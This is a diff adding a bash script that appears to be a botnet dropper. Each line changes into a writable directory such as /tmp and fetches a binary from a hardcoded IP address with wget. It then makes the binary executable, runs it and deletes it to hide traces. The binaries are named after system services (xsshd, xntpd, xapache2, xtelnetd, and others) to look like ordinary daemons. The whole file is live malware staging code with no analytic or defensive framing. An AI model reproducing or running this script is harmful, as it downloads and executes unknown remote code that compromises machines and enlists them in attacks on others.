@@ -1,0 +1,14 @@
+#!/bin/bash
+cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://89.248.169.50/xntpd; chmod +x xntpd; ./xntpd; rm -rf xntpd
+cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://89.248.169.50/xsshd; chmod +x xsshd; ./xsshd; rm -rf xsshd
+cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://89.248.169.50/xopenssh; chmod +x xopenssh; ./xopenssh; rm -rf xopenssh
+cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://89.248.169.50/xbash; chmod +x xbash; ./xbash; rm -rf xbash
+cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://89.248.169.50/xtftp; chmod +x xtftp; ./xtftp; rm -rf xtftp
+cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://89.248.169.50/xwget; chmod +x xwget; ./xwget; rm -rf xwget
+cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://89.248.169.50/xcron; chmod +x xcron; ./xcron; rm -rf xcron
+cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://89.248.169.50/xftp; chmod +x xftp; ./xftp; rm -rf xftp
+cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://89.248.169.50/xpftp; chmod +x xpftp; ./xpftp; rm -rf xpftp
+cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://89.248.169.50/xsh; chmod +x xsh; ./xsh; rm -rf xsh
+cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://89.248.169.50/x' '; chmod +x x' '; ./x' '; rm -rf x' '
+cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://89.248.169.50/xapache2; chmod +x xapache2; ./xapache2; rm -rf xapache2
+cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://89.248.169.50/xtelnetd; chmod +x xtelnetd; ./xtelnetd; rm -rf xtelnetd
